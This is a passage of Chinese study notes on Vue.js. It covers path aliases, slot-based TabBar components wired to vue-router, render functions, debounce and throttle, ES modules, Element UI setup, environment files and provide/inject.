this.$refs.name.$el 就是 <div class='tab-control'> <template>中的所有内容

<template>
  <div class='tab-control'>
  </div>
</template>
```

<br>

# Vue中监听图片的加载
原生中使用 img.onload = function
```js
<img @load='方法'>
```

<br>

# 路径的别名
在项目开发中我们可能在src引用图片路径的时候会写这样的路径
```js 
../../../assets/img/tabbar/home.svg
```

这样写一可能是不合理, 二可能最终找到的是一个错的  
所以在开发中 我们尽量的让多个../不要出现, 那怎么才能找到图片等资源呢? 我们可以给文件夹起个别名

起别名的功能也属于webpack中的配置, 所以我们先找到webpack.base.conf.js文件  
alias属性: (起别名的配置)  
比如下面我们给 src文件夹 起了别名 就意味着以后不用在写../../的写法, 我们可以直接使用@/文件的方式, 这样就会从src文件夹的角度去找文件

真实开发中会为很多文件夹起别名  
```js 
bulid -- webpack.base.conf.js 的 resolve 部分

// webpack.base.conf.js文件
resolve: {

  // 比如配置这里以后导入文件的时候可以省略这些后缀名
  extensions: ['.js', '.vue', '.json'],


  alias: {
    // 这里给src文件夹起了个别名 叫 @
    '@': resolve('src'),
    'assets': resolve('@/assets'),
    'components': resolve('@/components'),
    'views': resolve('@/views'),

    // cli3才可以在(@) 括号中使用 @ cli2的话 写正常的路径把
  }
},
```

### **注意:**
上面在webpack配置的resolve规则, 适用场景是 import 导入模块的时候  
当在标签内部的时候使用路径别名还是找不到的
```js 
<img src='@/img/xxx.jpg'>   还是找不到的
```

在标签内部的scr属性中想要使用别名的话 别名前加~ ~别名
```js 
<img src='~@/img/xxx.jpg'>
```

<br><br>

# vue的版本和vue-template-compiler的版本必须一致

<br><br>

# HTML部分: 补充

### **select标签**
效果就是一个下拉列表

**相关属性:**

**<font color="#C2185B">autofocus: autofocus</font>**  
页面加载后文本区域自动获得焦点

<br>

**<font color="#C2185B">disabled: disabled</font>**  
规定禁用该下拉列表。

<br>

**<font color="#C2185B">multiple: multiple</font>**  
下拉列表可显示多个选项 可以配合size属性使用 规定显示几个

<br>

**<font color="#C2185B">name: name</font>**  
规定下拉列表的名称。

<br>

**<font color="#C2185B">required: required</font>**  
规定下拉列表中可见选项的数目 所有主流浏览器都不支持 required 属性。

<br>

**<font color="#C2185B">size: number</font>**  
规定下拉列表中可见选项的数目。

<br>

**<font color="#C2185B">form: form的id</font>**  
在form表单标签外创建的下拉列表 也属于form       
```html
<select name="carlist" form="carform">
```

```html
<select name="" id="" multiple size='2'>
  <option value="volvo">volvo</option>
  <option value="saab">saab</option>
  <option value="opel">opel</option>
</select>
```

<br>

# 案例模块

# TabBar实现思路
首先 我希望页面中的底部 tabbar 封装成一个组件, 我希望这个 tabbar 不仅能在这个项目里能用, 在下一个项目里也能使用(下一个项目里图片和文字是不一样的), 所以我封装的组件的话, 希望它足够的灵活, 也就是说我这个组件里的图片和文字, 全部不是定义死的全都是由外界动态决定的

首先有一个整体的容器(TabBar组件), 我往里面放上插槽(这样别人就可以动态的往里放东西了, 让别人往里插入封装的另外一个小组件)
```
TabBar组件:
+ ------------------------------ +
+    slot插槽:                   +
+    +-----------------------------+      +
+    +                    +      +
+    +-----------------------------+      +
+ ------------------------------ +

TabBarItem小组件:
+--------+
+        +
+--------+
```

比如说我要往插槽里面放4个(首页 分类 购物车 我的), 那我就往插槽里面放4个TabBarItem小组件  
就意味着我可以用这4个TabBarItem小组件替换掉solt插槽 之后通过flex部分自动的把这4个组件布置好 

TabBarItem小组件里面还可以定义图片的插槽和文字的插槽, 就是很多东西都不要写死(这样别人在用这个小组件的时候就可以动态的决定这个小组件里面放什么东西)
```
TabBarItem小组件:
+--------+
+        +
+--------+
```

而且这个小的组件里面我希望定义一个属性props(用于别人传递过来的一些值, 这个值里我还要定义link属性, 因为点击这个小的TabBarItem的时候我要链接到某一个路由里面), 到时候根据这个link动态的进行相关的跳转

我们封装一些独立的组件, 让我直接可以传入图片传入文字, 到时候根据我传入的图片和文字, 自动显示按钮的图标和文字  
而且当我点击按钮的时候, 能够跳转到对应的组件上

<br>

### **目录结构**
```
| - assets
  | - img       图片资源放在这个文件夹里面
    | - tabbar  这里放相关的图片

  | - css       css放在这里面
    base.css    公共的css样式

| - components  放公共抽出来的组件
  | - tabbar    这里面放tabbar的所有组件
    TabBar.vue
    TabBarItem.vue

| - pages / views   放大的页面  每一个页面单独放一个文件夹
  | - home
  | - profile
  | - cart
  | - category

  App.vue
```

<br>

### **css的问题**
css样式引入的问题?
在App组件里面``<style>``里引入, 因为 main.js 一开始渲染的是 App.vue

引入方法: @import '路径'
如果是在js里引入的话, 我们使用import...from或者require等, 但现在我们是在``<style>``里面引入所以要使用固定格式

css样式写在相关的组件里, 比如TabBar的样式就写在``<style>``标签里

1. tabbar的height一般设置为49px;
2. 当设置position:fixed的时候宽度没有了 所以设置下left:0, right:0

<br>

### **导入组件的问题**
在 App.vue 中导入 TabBar.vue
在 ``<script>`` 里 import ... from ... 然后再 App.vue 组件里面注册, 注册完可以通过 ``<TabBar>`` 使用
```js 
import TabBar from './components/TabBar/TabBar'

export default {
  name: 'App',
  components: {
    TabBar
  }
}
```

<br>

### **组件的问题**
TabBar组件, 只管TabBar的部分, 里面的内容(小组件)的相关设置不要在TabBar.vue里面

<br>

### **各组件中的模板**
### **App**
```js 
<template>
  <div id="app">
    <TabBar></TabBar>
  </div>
</template>
```

### **TabBar**
```js 
<template>
  <div id='tab-bar'>
    <slot></slot>
  </div>
</template>
```

### **TabBarItem**
```js 
<template>
  <div class="tab-bar-item">
    <slot name="item-img"></slot>
    <slot name="item-text"></slot>
  </div>
</template>
```


### **使用插槽的时候**
用用``<template>``标签包裹 ``<template #item-img>``
```js 
<template v-slot:item-img>
  <span class='iconfont icon'>&#xe625;</span>
</template>

<template v-slot:item-text>
  <span>首页</span>
</template>
```

### **对上总结:**
1. 我们创建组件的时候最好考虑组件的复用性, 在上面的例子中 我们可以这么考虑 先创建一个TabBar组件, 里放上个插槽
2. 创建小组件TabBarItem, 里面放上两个具名插槽
3. 在App.vue文件里调用的时候, 我们通过``<template #slotname>``使用插槽

<br><br>

### **TabBarItem 小组件**
这个部分对 TabBarItem 小组件 里面的细节做一个补充  

我们需求:
当用户点击或者该组件处于活跃状态的时候我们应该文字和图片都响应的变化  
所以我们增加图片插槽的位置 给处于活跃状态的文件也定义了类

```js 
<template>
  <div class="tab-bar-item">
    <slot name="item-img"></slot>
    <slot name="item-img-active"></slot>
    <slot name="item-text"></slot>
  </div>
</template>
```

现在我们给图片预留出来一个插槽, 当图片处于活跃状态的时候, 我们有可能需要显示另外一张图片  
组件的应用应该是这样的, 使用的人只管放两张图片, 制作的人动态的决定两张图片中显示那张图片(负责逻辑)

一个插槽也不够用啊, 所以图片的位置应该是两个插槽, 两个插槽最终会展示一个  
下面的文字也是, 当处于活跃状态的时候, 应该变成红色吧, 也是应该动态添加某一个类

<br>

### **动态决定显示活跃图片还是非活跃图片**
使用 v-if='变量名' 
我们先定义一个变量 isActive=false 默认不展示  
然后在插槽内部使用v-if v-else
```js 
// 这里我们对 isActive 取反 不然就展示 else 了
<slot v-if='!isActive' name="item-img"></slot>
<slot v-else name="item-img-active"></slot>

export default {
  name: "TabBarItem",
  data() {
    return {
      isActive: false;
    }
  }
};
```

<br>

### **动态给文字添加类**
我们使用 v-bind:class='{类名: 变量名}'
v-bind:class='{active: isActive} 当 isActive为true的时候绑定active的类
``<style>``标签这也要定义好一个类

```html 
<slot v-bind:class='{active: isActive} 'name="item-text"></slot>

<style>
.active {
  color:#d4237a;
}
</style>
```

这么改完后发现 本应该应用的类并没有应用上 ``<span>``首页``<span>`` 上并没有 active的class    
原因是 ``<slot>`` 标签 最终会被 往里面填入的实际内容替换掉
```html 
<!-- App.vue文件中的代替插槽的<template> -->

<template #item-img>
  <span class='iconfont icon'>&#xe625;</span>
</template>

<!-- 最终会替换掉(ctrl+c ctrl+v)  ====> TabBarItem.vue文件的 -->
<slot v-bind:class='{active: isActive}' name="item-text"></slot>
``` 

那就意味着 App.vue文件中的代替插槽的``<template>`` 中并没有 v-bind:class='{active: isActive}' 这个部分

所以我们在封装插槽的时候 遇到添加类的问题 不会这么简单的封装  
我们会用一层div包裹插槽 然后class用在div这层包裹器上, 这样做的好处是, 即使插槽会被替换掉, 替换的也是``<slot>``的部分, div的样式照样能应用上
```js 
<div class='在这里添加类'>
  <slot></slot>
</div>
```

**最终:**
```html
<template>
  <div class="tab-bar-item">

    <!-- 我图片用的是图标字体 我也想让它有颜色的变化 所以 用一层<div>包裹, 并在上面绑定了动态class -->

    <div v-bind:class='{active: isActive}'>
      <slot v-if='!isActive' name="item-img"></slot>
      <slot v-else name="item-img-active"></slot>
    </div>


    <!-- 因为<slot>标签会被替换掉, 加上<slot>标签上面的class也会被替换掉, 跟没加似的, 所以我们把class属性放在<div>上 -->

    <div v-bind:class='{active: isActive}'>
      <slot name="item-text"></slot>
    </div>
  </div>
</template>
```

### **总结:**
插槽``<slot>``最终会被替换掉, 所以尽量不要在插槽上设置v-if v-bind v-else等属性, 我们都要给``<slot>``包裹一层``<div>``把上述类似的属性放在这层``<div>``里
也就是说插槽``<slot name=''>``里尽量只有name属性, 其它属性来一层包裹``<div>``
```html
<slot v-if='isActive' name='icon-img'></slot>     错的方式

<div v-if='isActive'>
  <slot name='icon-img'></slot>                   对的方式
</div>
```

<br><br>

### **tabbar-TabBarItem和router结合的结果**
每当我们点击tabbar里的按钮的时候, 页面上要显示对应的组件
```
  +--------------+
  +              +
  +     首页     +
  +              +
  +--------------+
  +--------+
  +  首页  +
  +--------+
```

这样就意味每一个按钮的点击事件 应该和路由的跳转对应起来

<br>

### **父子组件之间的参数传递**
跳转路由里面的路径, 我们需要让调用者传递进来, 也就是 父组件 -- 子组件 传递参数, 因为我们是在App.vue文件中调用TabBarItem.vue文件

所以我们还需要 使用 props属性

**注意:**
父组件传递参数的时候  
如果是 字符串 类型 我们直接写就可以
```html
<TabBarItem path='/home'> </TabBarItem>
```

如果是 变量 类型 我们就要用 v-bind:
```html
<TabBarItem :path='/home'> </TabBarItem>
```


```html 
<!-- TabBarItem.vue文件: -->
<template>
  <div class="tab-bar-item" @click='itemClick'>

    <div v-bind:class='{active: isActive}'>
      <slot v-if='!isActive' name="item-img"></slot>
      <slot v-else name="item-img-active"></slot>
    </div>

    <div v-bind:class='{active: isActive}'>
      <slot name="item-text"></slot>
    </div>
  </div>
</template>

<script>
  props: {
    path: String
  },
  methods: {

    // 这里还有个问题就是push(谁?), 我们需要让别人传递这个路径, 让你用我Item这个组件的时候, 就告诉我跳转的路径是什么 使用props属性, 这样别人在App.vue里面 将要跳转的路径传递进来

    itemClick() {
      // 在这里面进行路由的跳转, 我们根据用户需要不需要返回来决定使用哪个方法
      this.$router.push(this.path);
      this.$router.push(this.path);

      // 看评论知道:
      // 上面直接那么写会因为重复点击按钮会报错, 我们做个判断 判断当前路径和path是否相同
      if(this.$route.path != this.path) {
        this.$router.push(this.path)
      }

      // 解决报错的另外一种方式
      this.$router.push(this.path).catch(err => err)
    }
  }
</script>
```

<br><br>

### **点击按钮让, 让处于活跃状态的组件变色**
现在我希望点击按钮后 这个按钮文字变成红色, 图片也会切换到点击的状态
```js 
data() {
  return {
    isActive: false
  }
},
```
我们之前把isActive写在data()函数里面 但写在这里面没办法动态去定义true 还是 false

所以我们要写在 computed 计算属性中, 在这里我们可以动态的决定 isActive 的值
```js 
computed:{
  isActive() {

    // 哪一个路由活跃就能得到活跃路由的path, 然后我们判断下活跃路由的path里面有没有这个页面的path, 活跃的路由是/home, 我们有4个页面 item1(/home) 那就是 true

    // /home - > item1(/home) = true
    // /home - > item1(/category) = false
    // /home - > item1(/cart) = false
    // /home - > item1(/profile) = false

    return this.$route.path.indexOf(this.path) !== -1;
  }
},
```

上面动态的决定了 isActive 的属性是true 还是 false, 接下来就能通过布尔值来决定是否应用active的类了
```js 
// TabBarItem.vue组件里:
<div v-bind:class='{active: isActive}'>

</div>
```

<br>

### **添加新的需求 调用者自己决定活跃的文字颜色**
现在活跃状态下的颜色是红色, 当有人想要是粉色紫色的时候怎么办  
我不希望写死颜色(或者说css样式), 我希望用的人可以自己定义颜色

我们希望在 App.vue文件里使用组件的时候, 别人在组件的标签内部 自己写个activeColor='blue', 就会变成对应的颜色  
既然是在 App.vue 里面向 TabBarItem.vue 传递参数 那又是 父子之间的通信 需要使用props属性

我们在 TabBarItem.vue 文件中 继续添加属性
```js 
props: {
  path: String,
  activeColor: {
    type: String,
    default: '#d4237a'
  }
},
```

上面我们是动态绑定 class 还决定 活跃状态的颜色的, 现在因为我们要把 父--子的参数拿到 应用在样式中, 所以没办法使用 :class 了
```js 
// 这么写 只能通过 修改源代码去改颜色
<div v-bind:class='{active: isActive}'>
  <slot name="item-text"></slot>
</div>

// 不使用 :class 了  === > 

<div :style='activeStyle'>
  <slot name="item-text"></slot>
</div>

props: {
  path: String,
  activeColor: {
    type: String,
    default: '#d4237a'
  }
},

computed: {
  activeStyle() {
    // 是否处于活跃
    return this.isActive ? {color: this.activeColor} : {}
  }
}
```

**对上解析:**  
我们要通过组件(TabBarItem.vue)调用者来决定当前的活跃状态下 文字和图片显示什么样式
1. 所以就需要使用 props 属性, 同时我们在props中设置了默认颜色
2. 我们使用 :style='activeStyle' 绑定了一个变量, 同时这个变量又是动���决定的所以 我们要将这个变量放在 computed 计算属性中
```js 
computed: {
  isActive() {
    return this.$route.path.indexOf(this.path) !== -1;
  },
  
  activeStyle() {
    // 是否处于活跃
    return this.isActive ? {color: this.activeColor} : {}
  }
}
```
this.isActive 是计算属性中的变量, 所以它是动态的 看看是否在活跃状态 如果是活跃状态 style='{color: this.activeColor}' 就会变成 用户传递的值  
this.activeColor 是 props 中的属性 用于接收父组件传递进来的参数

3. 在App.vue文件中 把颜色参数传递进来
```js 
  <TabBarItem path='/home' activeColor='purple'>
  </TabBarItem>
```

<br>

### **抽取App.vue中主要组件内容 到一个新的组件里**
现在的状态是 App.vue 文件里 我们要往组件的插槽里放内容, 导致App.vue文件内的代码太多, 所以把这些代码抽取到一个组件里 再引入进来

1. 因为是公共样式, 我们抽取到了 components 文件夹里 起名为 MainTabBar.vue
2. 将``<TabBar>``里所有的内容 贴到 MainTabBar.vue的``<template>``中
3. 将 MainTabBar.vue 文件需要用的组件 导入 并注册, 还有iconfont的css文件
4. App.vue文件中引入 MainTabBar.vue 并注册

<br><br>

# 技巧

### **如何在Vue中使用mock**
```
npm i mockjs
```

import  
定义规则   
如果不使用拦截的话可以不传递第一个url参数 然后使用变量接收

```js
import Mock from "mockjs";
Mock.mock("http://localhost:3200/data", {
  "list|5-10": [
    {
      flag: "@id",
      "title|+1": ["基本情報", "登録情報", "事務所等情報", "連絡先", "資格情報", "政治連盟", "その他", "口座情報", "交通費", "自宅"],
      "options|3-5": [
        {
          "subTitle|+1": ["登録番号", "氏名", "フリガナ", "生年月日", "性別", "支部", "種別", "変更年月日", "入会年月日", "登録年月日"],
          type: "input",
          prop: /[\u0041-\u005a]{5}/,
        }
      ],
    }
  ]
})
```

<br>

### **Vue中 deep 的使用方式**
一般在使用scoped后 父组件的样式将不会渗透到子组件中 而我们调用的element组件就相当于在父组件中使用子组件  
这时候我们想改变element组件的部分样式时 就要在class类名前加上 /deep/ 或者 >>> 或者 ::v-deep  
.(外层class) >>> .(内层class)

vue在解析样式的时候会在类名的后面加上[vasdf2323]之类的属性 当我们使用 deep 后该属性就会加在外层class上 获取我们修改的样式就会生效  
.(外层class) .(内层class)[data-v-asfda123]  
.(外层class) >>> .(内层class)   ---   .(外层class)[data-v-asfda123]  .(内层class)

```js
.table-wrap /deep/ .el-table__header-wrapper .cell {
  padding-left: 0;
}
```

<br>

### **render函数**
render方法的实质就是生成template模板

<br>

### **要点:**
组件内部要是使用 render函数的话 就不能在写``<template>``标签了
```js 
  // 带有render函数的组件应该是这样的
  
  // 不能写 <template>

  <script>
    export default {
      name: "",
      render() {}
    }
  </script>

  <style>
    ......
  </style>
```

<br>

我们先回忆一下 整个页面的挂载流程
1. 模板通过编译生成ast 再由ast生成vue的render函数(渲染函数)
2. 渲染函数结合数据生成虚拟dom树
3. 再经过diff和patch后生成新的ui

**模板:**  
Vue的模板基于纯HTML 基于Vue的模板语法

**AST:**  
Vue使用HTML的Parser将HTML模板解析为AST 并且对AST进行一些优化的标记处理 提取最大的静态树 方便Virtual DOM时直接跳过Diff

**渲染函数:**  
渲染函数是用来生成Virtual DOM的。Vue推荐使用模板来构建我们的应用界面 在底层实现中Vue会将模板编译成渲染函数 当然我们也可以不写模板 直接写渲染函数 以获得更好的控制 

**Virtual DOM:**  
虚拟DOM树 Vue的Virtual DOM Patching算法是基于Snabbdom的实现 并在些基础上作了很多的调整和改进。

**Watcher:**  
每个Vue组件都有一个对应的watcher 这个watcher将会在组件render的时候收集组件所依赖的数据 并在依赖有更新的时候 触发组件重新渲染。你根本不需要写shouldComponentUpdate Vue会自动优化并更新要更新的UI。

<br>

### **createElement参数**
createElement 有三个参数

<br>

### **参数1:**
String | Object | Function
第一个参数对于createElement而言是一个必须的参数 这个参数可以是字符串string、是一个对象object 也可以是一个函数function。

```js 
// 可以是 标签 
createElement("div")

// 可以是 模板
createElement({
  template: "<div>hello</div>"
})

// 还可以是一个函数 return 一个模板出来
```

<br>

### **参数2:**
可选参数
参数类型是一个对象 该对象中可以定义一些属性 会显示在标签属性或者标签文本中
```js 
createElement("div", {

  // class
  "class": {
    foo: true
  },
  
  // 内联样式
  style: {
    color: "red"
  }

  // 标签属性
  attrs: {
    name: "headingId",
    href: "",
    id: ""
  }

  // dom属性
  domProps: {
    innerHTML: "<span style="color:blue;font-size:24px">江心比心</span>"
  }

  // 组件的props
  props: {
    myProp: 'bar'
  }

  on: {
    click: function(event) {
      event.preventDefault();
      console.log(111);
    }
  }

  // 仅对于组件 用于监听原生事件 而不是组件内部使用 `vm.$emit` 触发的事件。
  nativeOn: {
    click: this.nativeClickHandler
  }

  // 自定义指令。注意事项: 不能对绑定的旧值设值  Vue 会为您持续追踪
  directives: [
    {
      name: 'my-custom-directive',
      value: '2',
      expression: '1 + 1',
      arg: 'foo',
      modifiers: {
        bar: true
      }
      }
    ]

    // Scoped slots in the form of
    - { name: props => VNode | Array<VNode> }
    scopedSlots: {
      default: props => createElement('span', props.text)
    },

    // 如果组件是其他组件的子组件 需为插槽指定名称
    slot: 'name-of-slot',

    // 其他特殊顶层属性
    key: 'myKey',
    ref: 'myRef'
  })
```

<br>

### **参数3:**
这个参数是可选的
可以给其传一个String 或 Array
第三个参数可以设置多个子元素 是一个数组 “可选”
```js 
return createElement(
  'div', 
  {
    class: {
      title: true
    },
    style: {
      border: '1px solid',
      padding: '10px'
    }
  }, 
  [
    createElement('h1', 'Hello Vue!'),
    createElement('p', '开始学习Vue!')
  ] 
)
```

<br>

### **利用render函数实现 v-if v-for**
```js 
Vue.component('tb-heading', {
  render: function(createElement) {
    console.log(this)
    if (this.items.length) {
      return createElement('ul', this.items.map(function(item){
        return createElement('li', item.name);
      }))
    } else {
      return createElement('p', 'No items found.');
    }
  },
  
  props: {
    items: {
      type: Array,
      default: function() {
        return [
          {
            name: 'kongzhi1'
          },
          {
            name: 'kongzhi2'
          }
        ]
      }
    }
  }
});
```

<br>

### **render函数实现 v-model**
```js 
<script>
  Vue.component('tb-heading', {
    render: function(createElement) {
      var self = this;
      return createElement('input', {
        domProps: {
          value: '11'
        },
        on: {
          input: function(event) {
            self.value = event.target.value;
            self.$emit('input', self.value);
          }
        }
      })
    },
    props: {
      
    }
  });
  new Vue({
    el: '#container',
    methods: {
      inputFunc: function(value) {
        console.log(value)
      }
    }
  });
</script>
```
<br><br>

### **路由重复报错**
在路由的indexjs文件中 加上这样的配置
```js 
const originalPush = VueRouter.prototype.push

VueRouter.prototype.push = function push(location) {
  return originalPush.call(this, location).catch(err => err)
}
```

### **style中 导入样式**
```
@import "../../"
```

<br>

### **element ui中 给组件加样式的方式**
1. 可能需要less
2. 选择器前面使用 /deep/
3. 给目标组件添加class(或者是目标组件包裹容器)
4. 找到目标组件内目标元素身上的类名 添加我们自己的样式
```scss 
/deep/ .input-new-tag .el-input__inner {
  width: 120px;
}
```

<br>

### **loading加载动画**
定义一个loading组件  
然后父组件中请求数据, 比如说3秒之后返回  
然后我们把这个组件引入父组件中, v-show='!listData.length'

<br>

### **一些公共样式可以写在App的样式里面 这样其它组件都可以直接使用**

<br>

### **Vue中的防抖 与 节流**
我先说下 项目中遇到了什么 导致我需要去研究 防抖和节流的功能

背景: 我在项目中点击按钮后 随着多次点击 会触发多次事件
```
b组件 用了 btn - @click - $bus.$emit("submit")
a组件 用了 created - &bus.&on("submit")
```

**防抖:**   
利用了 setTimeout 原理就是当我点击按钮后 会开启定时器 当我多次点击按钮后 只会关闭之前的定时器后重新计时 而它的效果就是 点击后多少秒触发事件

**节流:**   
在规定的时间段内只会触发一次 不管点多少次

开始我在b组件中 创建了 防抖和节流函数 发现 点击 return 的 function 并没有办法触发
随后我去a组件中 给

```js 
// methods中定义 函数

// 防抖函数
debounce(fn, delay) {
  let timer = null

  return (...args) => {
    if(timer) clearTimeout(timer)
    timer = setTimeout(() => {
      fn.apply(this, args)
    }, delay)
  }
}


// 节流函数
throttle(fn, interval) {
  let last = 0
  return (...args) => {
    let now = +new Date()
    if((now - last) > interval) {
      last = now
      fn.apply(this, args)
    }
  }
}
```

<br>

***使用方式:*** 
1. 使用防抖函数将 逻辑函数(目标函数)包裹在里面
2. 将这个函数交给了一个变量
3. 在需要调用防抖函数的位置 调用防抖函数
```js 
created() {
  let debounceSubmit = this.debounce(this.onceFeatureSubmit, 500)
  this.$nuxt.$on("submit", () => {
    debounceSubmit()
  })
}
```

<br>

### **template v-for key值的解决方法**
当需要遍历多个元素一个结构的时候 我们可以考虑使用 template 但是就会产生key值的问题
key值必须加在真实的结构上 所以会报错
```html
<dl class="m-txt__normal--bold p-campaign-winner--info-text">
  <template v-for="(item, index) of campaignData">
    <dt :key="'dt' + index">{{item.title}}</dt>
    <dd :key="'dd' + index" v-html="item.content"></dd>
  </template>
</dl>
```

<br><br>

# ES模块化的导出和导入
### **<script src='./xxx.js' type='module'>**
在script标签内部 写上type='module' 代表这个js文件 是一个模块 有自己的作用域, 不会产生命名冲突的问题

这样就产生一个问题 每一个js文件都是一个模块, 他们都是一个封闭的空间, js文件中的变量不能相互引用, 所以要是想让一个变量可以在另一个js文件中使用, 我们要把这个变量导出去

<br>

### **导出 export**
export { }

<br>

### **导入 import 变量名 or {解构赋值} from '路径.后缀名'**
通过解构赋值的方式, 获取到导出的变量
```
import { 变量名, 变量名 } from "./路径.后缀名"
```

<br>

### **注意:**
上面是导出叫什么名字, 我们接收的时候就要用什么名字
```js 
export {
  a
}

import {a} from './aaa.js'
```

<br>

### **export default**
某些情况下, 一个模块中包含某个功能, 我们并不希望给这个功能命名, 而且让导入者可以自己来命名
这个时候我们就可以使用export default

我们在引入的时候就可以自己起变量名 default导出的东西只能有有一个

```js 
  export default {
    a
  }

  // 我们可以自己起名字
  import asdf from './aaa.js'
```

<br>

### **import 的使用**
我们使用export指令导出了模块对外提供的借口, 下面我们就可以通过import命令来加载对应的这个模块了

首先 我们需要在html代码中引入两个js文件, 并且类型需要设置为module  
只有type是module才支持这种语法 浏览器底层给我们做了支撑
```html
<script src='_./bbb.js' type='module'></script>
<script src='./aaa._js' type='module'></script>
```

import指令用于导入模块中的内容, 比如main.js的代码
```
import {name, age, height} from './info.js'
```

<br>

### **统一全部导入: import * as info(自定定义的名) from './info.js'**
如果我们希望某个模块中所有的信息都导入, 一个个导入显然有些麻烦, 有可能导入的变量名和我们文件的变量名冲突  
比如上面有name age height需要导出

- 我们可以通过 * 可以导入模块中所有的 export变量
- 但是通常情况下 我们需要给 * 起一个别名, 方便后续的使用
- 相当于把所有变量都放入 info 里面

```js
import * as info from './info.js'
console.log(info.name, info.age, info.height)
```

<br><br>

# Vue UI组件库
移动端常用的ui组件库
Vant
CubeUI
MintUI


pc端常用的UI组件库
element UI
Iview UI

<br>

### **安装方式**
```
npm i element-ui --save
```

也可是使用 link 方式来引用它
```js 
import Vue from 'vue'

// 引入 elementui组件库
import ElementUI from 'element-ui'

// 引入 elementui全部样式
import 'elment-ui/lib/theme-chalk/index.css'

// 这样elementui组件里面的所有东西全部会被注册
Vue.use(ElementUI)
```

<br>

### **按需引用**
按需引入的情况下 要把上面的3行全部删掉
```js 
// 删掉
import ElementUI from 'element-ui'
import 'elment-ui/lib/theme-chalk/index.css'
Vue.use(ElementUI)
```

<br>

```js
npm install babel-plugin-component -D
npm i babel-preset-es2015 --save
```

<br>

### **修改 babel.config.js 文件**  
按照下面的改 因为脚手架和elementui的官网更新速度不一样导致的 配置信息跟不上
```js 
module.exports = {
  presets: [
    '@vue/cli-plugin-babel/preset',
    ["@babel/preset-env", { "modules": false }]
  ],
  "plugins": [
    [
      "component",
      {
        "libraryName": "element-ui",
        "styleLibraryName": "theme-chalk"
      }
    ]
  ]
}
```

如果报错下方错误的情况下:   
Error: Plugin/Preset files are not allowed to export objects, only functions. In /Users/liulin/Desktop/Sam/file/Vue/study_vue/node_modules/babel-preset-es2015/lib/index.js
  
<br>

### **3. 在 main.js 文件中 添加按需引入的组件**
```js 
import { Button, Select } from 'element-ui';
Vue.use(Button)
Vue.use(Select)
```

<br><br>

# 文档相关的知识点总结

### **.env.development & .env.production**
在构建项目的时候 我们可以在根目录下面创建 *不能给他们包文件夹* 就在根目录下

- .env.development 
- .env.production 
- .env 等文件
```
| - env
  - .env.development 
      这是开发环境下的配置文件。

  - .env.production 
      这是生产环境下的配置文件

  - .env
      这是一些全局的属性。
```

该文件内部可以定义环境变量

```js

// .env.development 文件内容: 
ENV = 'development'
VUE_APP_WS_HOST = 'wss://live.buding:8888'
VUE_APP_BASE_API = 'https://development:8888/api/v1'
VUE_CLI_BABEL_TRANSPILE_MODULES = true


//.env.production 文件内容: 
ENV = 'production'
VUE_APP_WS_HOST = 'wss://live.vuding:8888'
VUE_APP_BASE_API = 'https://production:8888/api/v1'


// .env 文件内容: 
NODE_ENV = 'buding'

// 定义全局变量必须以VUE_APP开头
VUE_APP_TITLE = ''
VUE_APP_URL = 'https://quanju:8888/api/v1'
```

<br>

### **模板中 :src 引入图片 的方式**
1. <img :src="require(`./assets/${imgName}`)" alt="">

2. 
```js
data() {
  return {
    books: [1, 2, 3],
    imgName: "51636690825_.pic_hd.jpg",
    img: require("./assets/51636690825_.pic_hd.jpg")
  }
},
```

<br>

### **创建实例 createApp**
每个vue应用都是通过用 createApp 函数创建一个新的应用实例
```js
const app = Vue.createApp({ 配置对象 })

// 这是不是相当于 new Vue({})
```

我们可以通过 app 实例来注册全局组件
```js
const app = Vue.createApp({})
app.component('SearchInput', SearchInputComponent)
app.directive('focus', FocusDirective)

app.use(LocalePlugin)

// 还可以链式调用
Vue.createApp({})
  .component('SearchInput', SearchInputComponent)
  .directive('focus', FocusDirective)
  .use(LocalePlugin)
```

<br>

### **实例的配置对象**
emits: {}
emits: []
用于注册自定义事件

<br>

### **链式注册插件**
```js
import { createApp } from 'vue'
createApp(App).use(store).use(router).mount('#app')
```

<br>

### **注册全局组件**
通过 let app = createApp() 得到的app对象 来注册全局组件

<br>

### **组件之间的通信 Provide / inject**
作用: 用于组件之间 嵌套层次太深的情况下的组件之间的通信

### provide: 父组件用来提供数据

**格式:对象写法**  
provide的值定义成一个对象 用于提供定义死的数据
```js
provide: {
  key: value
}
```

**格式:函数写法**  
将provide写成一个函数 函数内部reture一个对象 用于传递组件实例上的数据
```js
provide() {
  return {
    todoLength: this.todos.length
  }
},
```

<br>

### inject: 子组件用来接收和使用数据
**使用方式:**  
父组件: 在实例中 使用 "provide" 配置项来定义要提供的数据  
子组件: 在实例中 使用 "inject" 来接收数据

```js
// 父组件
export default {
  name: "App",
  data() {
    return { }
  },

  // 使用 provide 提供数据
  provide: {
    username: "sam"
  }
}

// 子组件
export default {
  name: "Child",

  // 使用inject接收数据
  inject: ["username"],
}
```

**注意:**
**1. provide的对象写法不用用于传递实例上定义的属性 会导致报错**  
``Cannot read property 'length' of undefined``

```js
data() {
  return {
    todos: ['Feed a cat', 'Buy tickets']
  }
},
provide: {
  // 我们传递data中的属性是不行的
  todoLength: this.todos.length 
},
```
上述情况要使用provide的函数形式的写法

<br>

**2. provide中定义的数据 我们通过this访问不到**  
```js
// 定义一个方法尝试方式provide中的数据
methods: {
  handleClick() {
    // 未定义
    console.log(this.username)
  }
},

// provide定义的数据
provide: {
  username: "sam"
},

provide() {
  return {
    username: "sam",
    num: this.books.length
  }
}
```

<br>

**3. 使用provide / inject这种方式 传递的数据不是响应式的**  
我们尝试在父组件中修改provide传递过去的值 发现子组件并没有做出响应式
```js
// 父组件
provide() {
  return {
    num: this.books.length
  }
}


methods: {
  handleClick() {
    // 删除数组中的元素后 子组件并没有做出相应
    this.books.pop()
  }
},

```

处理响应式的解决方法:  
在上面的例子中 如果我们更改了 todos 的列表 这个变化并不会反映在 inject 的 todoLength property 中。  
**这是因为默认情况下 provide/inject 绑定并不是响应式的**。

我们可以通过传递一个 ref property 或 reactive 对象给 provide 来改变这种行为。  
在我们的例子中 如果我们想对祖先组件中的更改做出响应 我们需要为 provide 的 todoLength 分配一个组合式 API computed property: 

```js
app.component('todo-list', {
  // ...
  provide() {
    return {
      todoLength: Vue.computed(() => this.todos.length)
    }
  }
})

app.component('todo-list-statistics', {
  inject: ['todoLength'],
  created() {
    console.log(`Injected property: ${this.todoLength.value}`) // > 注入的 property: 5
  }
})
```

<br>

# **组合式API**

### **setup 组件选项:**
**要点:**  
1. setup中不要使用this 因为找不到组件实例  
因为setup在data computed methods等之前 比beforeCreate都早 所以没办法获取到this

<br>

### **配置项setup接收两个参数**
```js
setup(props, context) {

}
```

```js
export default {
